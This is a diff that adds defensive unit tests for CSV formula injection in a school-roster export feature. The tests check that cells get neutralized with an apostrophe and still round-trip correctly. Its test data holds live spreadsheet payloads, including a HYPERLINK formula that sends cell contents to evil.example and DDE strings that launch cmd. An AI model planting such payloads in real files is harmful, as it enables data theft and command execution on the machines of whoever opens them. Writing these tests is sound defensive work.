@@ -1052,3 +1052,55 @@ describe("export round trips", () => {
     expect(mapClassRows(parseCsv(exported)).rows[0]?.name).toBe("7A; parallell");
   });
 });
+
+
+describe("formula injection", () => {
+  // The data is not typed by us: a school's roster arrives by CSV from a
+  // municipal system, and SchemaPro stores whatever a name field contains. The
+  // payload does nothing here — it runs when an administrator opens the export.
+  const attacks = [
+    ["=HYPERLINK(\"http://evil.example/\"&A1,\"klicka\")", "equals"],
+    ["+1+1", "plus"],
+    ["-2+3+cmd|' /C calc'!A0", "minus"],
+    ["@SUM(1+1)*cmd|' /C calc'!A0", "at"],
+    ["\t=1+1", "leading tab"],
+    ["   =1+1", "leading spaces"],
+  ] as const;
+
+  it.each(attacks)("neutralizes %s (%s)", (payload) => {
+    const csv = serializeCsv(["name"], [[payload]]);
+    const cell = csv.split("\r\n")[1]!;
+
+    // Quoting alone is not a defence — a spreadsheet evaluates a quoted field
+    // too. The apostrophe is what marks the cell as text.
+    expect(cell.replace(/^"/, "").startsWith("'")).toBe(true);
+  });
+
+  it("survives export → import → export unchanged", () => {
+    // A guard that corrupted the round-trip would be its own bug: these files
+    // are re-imported, and a name must come back as the name.
+    const original = "=HYPERLINK(\"http://x/\")";
+    const parsed = parseCsv(serializeCsv(["name"], [[original]]));
+
+    expect(parsed.rows[0]?.[0]).toBe(original);
+    expect(serializeCsv(["name"], [[parsed.rows[0]![0]!]])).toBe(
+      serializeCsv(["name"], [[original]]),
+    );
+  });
+
+  it("leaves a negative number a number", () => {
+    // Guarding -5 would turn a figure that sums into text that does not.
+    expect(serializeCsv(["n"], [["-5"]])).toContain("-5");
+    expect(serializeCsv(["n"], [["-5"]])).not.toContain("'-5");
+  });
+
+  it("leaves an ordinary name alone", () => {
+    expect(serializeCsv(["name"], [["Öberg"]])).toContain("Öberg");
+    expect(serializeCsv(["name"], [["Öberg"]])).not.toContain("'Öberg");
+  });
+
+  it("does not strip an apostrophe that belongs to the value", () => {
+    const parsed = parseCsv(serializeCsv(["name"], [["'Anna'"]]));
+    expect(parsed.rows[0]?.[0]).toBe("'Anna'");
+  });
+});
